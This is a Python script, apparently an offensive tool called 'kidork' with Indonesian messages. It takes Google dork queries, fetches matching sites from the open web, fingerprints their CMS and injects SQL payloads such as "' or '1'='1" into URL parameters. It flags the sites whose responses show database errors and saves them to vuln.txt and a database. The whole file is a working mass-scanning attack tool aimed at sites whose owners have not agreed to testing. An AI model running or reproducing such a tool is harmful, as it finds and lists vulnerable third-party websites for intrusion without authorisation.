import asyncio
import aiohttp
import os
import sys
import time
import re
import sqlite3
from collections import defaultdict
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from dotenv import load_dotenv

load_dotenv()
API_KEY = os.getenv("GOOGLE_API_KEY")
SEARCH_ENGINE_ID = os.getenv("SEARCH_ENGINE_ID")

SQL_ERRORS = [
    r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"MySQLi_.*error",
    r"PostgreSQL.*ERROR", r"pg_.*error", r"ORA-\d{5}",
    r"Oracle.*error", r"unexpected end of SQL command", r"unterminated quoted string"
]

def color(text, code): return f"\033[{code}m{text}\033[0m"
def info(msg): print(color("[i] ", "36") + msg)
def success(msg): print(color("[✓] ", "32") + msg)
def warn(msg): print(color("[!] ", "33") + msg)
def error(msg): print(color("[-] ", "31") + msg)
def vuln(msg): print(color("[!!! SQLi VULN] ", "91") + msg)

def banner():
    print(color(r"""
     )  (    (         )   (         )     *        )  (     
  ( /(  )\ ) )\ )   ( /(   )\ )   ( /(   (  `    ( /(  )\ )  
  )\())(()/((()/(   )\()) (()/(   )\())  )\))(   )\())(()/(  
|((_)\  /(_))/(_)) ((_)\   /(_))|((_)\  ((_)()\ ((_)\  /(_)) 
|_ ((_)(_)) (_))_    ((_) (_))  |_ ((_) (_()((_)__((_)(_))   
| |/ / |_ _| |   \  / _ \ | _ \ | |/ /  |  \/  |\ \/ // __|  
  ' <   | |  | |) || (_) ||   /   ' <   | |\/| | >  < \__ \  
 _|\_\ |___| |___/  \___/ |_|_\  _|\_\  |_|  |_|/_/\_\|___/  

       github.com/MouseExploitSec • by sam/msxsec
""", "35"))

async def fetch(session, url):
    try:
        async with session.get(url, timeout=10) as resp:
            return await resp.text()
    except:
        return ""

def extract_params(url):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    return list(params.keys()) if params else []

def inject_payload(url, payload="'"):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    for key in query.keys():
        query[key] = payload
        break
    new_query = urlencode(query, doseq=True)
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

async def check_sqli(session, url):
    payloads = ["'", "'--", "'#", "' or '1'='1"]
    for p in payloads:
        test_url = inject_payload(url, p)
        if test_url:
            html = await fetch(session, test_url)
            for pattern in SQL_ERRORS:
                if re.search(pattern, html, re.IGNORECASE):
                    return True
    return False

async def detect_cms(session, url):
    html = await fetch(session, url)
    if "wp-content" in html or "wordpress" in html: return "WordPress"
    if "joomla" in html: return "Joomla"
    if "drupal" in html: return "Drupal"
    if "shopify" in html: return "Shopify"
    if "prestashop" in html: return "PrestaShop"
    if "magento" in html: return "Magento"
    return "Unknown"

def save_to_db(results):
    conn = sqlite3.connect("results.db")
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS hasil_dork (
            url TEXT PRIMARY KEY,
            vulnerable INTEGER,
            cms TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    """)
    for url, vuln, cms in results:
        c.execute("INSERT OR IGNORE INTO hasil_dork (url, vulnerable, cms) VALUES (?, ?, ?)", (url, int(vuln), cms))
    conn.commit()
    conn.close()

async def google_search(query, max_results):
    links = []
    start = 1
    while len(links) < max_results:
        url = f"https://www.googleapis.com/customsearch/v1?key={API_KEY}&cx={SEARCH_ENGINE_ID}&q={query}&start={start}"
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(url) as resp:
                    data = await resp.json()
            except Exception as e:
                error(f"Gagal mengambil data: {e}")
                break
        if "items" not in data:
            break
        for item in data["items"]:
            link = item.get("link")
            if link and link not in links:
                links.append(link)
            if len(links) >= max_results:
                break
        start += 10
        await asyncio.sleep(1)
    return links

async def process_url(session, url, scan_sqli, vuln_list, cms_count):
    cms = await detect_cms(session, url)
    cms_count[cms] += 1
    vulnerable = False
    if scan_sqli and extract_params(url):
        vulnerable = await check_sqli(session, url)
    output = f"[+] {url} | CMS: {cms}"
    if vulnerable:
        output += color(" [SQLi VULNERABLE]", "91")
        vuln_list.append(url)
        with open("vuln.txt", "a") as vf:
            vf.write(url + "\n")
    print(output)
    return (url, vulnerable, cms)

async def main(queries, max_results, save_file, scan_sqli):
    banner()
    async with aiohttp.ClientSession() as session:
        all_results = []
        vuln_list = []
        cms_count = defaultdict(int)

        for query in queries:
            info(f"Mencari: {query}")
            urls = await google_search(query, max_results)
            tasks = [process_url(session, url, scan_sqli, vuln_list, cms_count) for url in urls]
            result = await asyncio.gather(*tasks)
            all_results.extend(result)

        if save_file:
            with open(save_file, "w") as f:
                for url, _, _ in all_results:
                    f.write(url + "\n")
            print() 
            success(f"Disimpan ke file: {save_file}")

        if vuln_list:
            success(f"{len(vuln_list)} URL disimpan ke vuln.txt")
        else:
            success("Tidak ada URL yang vulnerable (SQLi)")

        save_to_db(all_results)
        success("Disimpan ke database: results.db")

        print()
        success(f"Total hasil unik: {len(all_results)}")
        success(f"Total yang vulnerable: {len(vuln_list)}")
        for cms, jumlah in cms_count.items():
            success(f"CMS {cms}: {jumlah} URL")

if __name__ == "__main__":
    if len(sys.argv) < 2 or sys.argv[1] in ["-h", "--help"]:
        banner()
        print("""
Usage:
  python kidork.py "inurl:detail.php?id=" -j 50 --save hasil.txt --scan-sqli

Options:
  -j N               Jumlah hasil (default 50)
  --save FILE        Simpan hasil ke file
  --scan-sqli        Aktifkan scan SQLi
""")
        sys.exit(0)

    dorks_list = sys.argv[1].split(",")
    max_res = 50
    save_f = None
    scan = False

    if "-j" in sys.argv:
        try:
            max_res = int(sys.argv[sys.argv.index("-j") + 1])
        except:
            error("Jumlah hasil invalid")
            sys.exit(1)

    if "--save" in sys.argv:
        try:
            save_f = sys.argv[sys.argv.index("--save") + 1]
        except:
            error("Nama file output invalid")
            sys.exit(1)

    if "--scan-sqli" in sys.argv:
        scan = True

    if sys.platform == "win32":
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

    asyncio.run(main(dorks_list, max_res, save_f, scan))
